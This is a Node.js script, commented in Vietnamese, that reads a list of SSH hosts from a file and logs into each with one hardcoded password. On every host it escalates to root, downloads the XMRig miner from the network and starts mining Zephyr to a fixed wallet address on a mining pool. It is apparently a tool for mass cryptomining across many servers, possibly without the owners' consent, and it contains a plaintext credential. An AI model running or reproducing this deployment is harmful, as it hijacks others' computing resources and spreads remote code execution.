const fs = require('fs');
const readline = require('readline');
const Client = require('ssh2').Client;

// Danh sách thông tin VPS
const vpsList = [];

// Đọc dữ liệu từ file
const rl = readline.createInterface({
  input: fs.createReadStream('data.txt'),
  crlfDelay: Infinity,
});

// Đọc dòng từ file và thêm vào danh sách
rl.on('line', (line) => {
  // Tách thông tin VPS từ dòng trong file
  const [usernameHost, port] = line.split('-p');
  const [username, host] = usernameHost.split('@');
  const password = 'Vietnam123@@@';

  // Kiểm tra định dạng của dòng
  if (host && port) {
    // Thêm thông tin VPS vào danh sách
    vpsList.push({
      host: host.trim(),
      port: port.trim(),
      username: username.trim(),
      password,
    });
  } else {
    console.log(`Invalid format in line: ${line}`);
  }
});

// Khi đã đọc hết file, thực hiện kết nối và chạy lệnh
rl.on('close', () => {
  vpsList.forEach((vps) => {
    const { host, port, username, password } = vps;

    const commands = [
      'sudo su',
      'wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz',
      'tar xavf xmrig-6.19.2-linux-x64.tar.gz',
      'cd xmrig-6.19.2',
      'screen -R',
      './xmrig -o zephyr.miningocean.org:5462 -a rx -k -u ZEPHYR2Nk4PMWboF1H3qMXdTGp9mj9ddp7Zrkek5X7LEgFPtoohUw5tMcdAixPbzkZHsJqoBcquZsYfJGccsQde5VGfrzpvM8LW3a -p test -t 92',
      'exit', // Để đảm bảo kết thúc session sau khi thực hiện lệnh
    ];

    const conn = new Client();

    conn
      .on('ready', () => {
        console.log(`SSH connection successful to ${host}:${port}`);

        conn.shell((err, stream) => {
          if (err) throw err;

          stream.on('close', () => {
            console.log('Connection closed');
            conn.end();
          }).on('data', (data) => {
            console.log(`OUTPUT (${host}:${port}): ` + data);
          });

          commands.forEach((command) => {
            stream.write(command + '\n');
          });

          stream.end('exit\n');
        });
      })
      .connect({
        host,
        port,
        username,
        password,
      });
  });
});
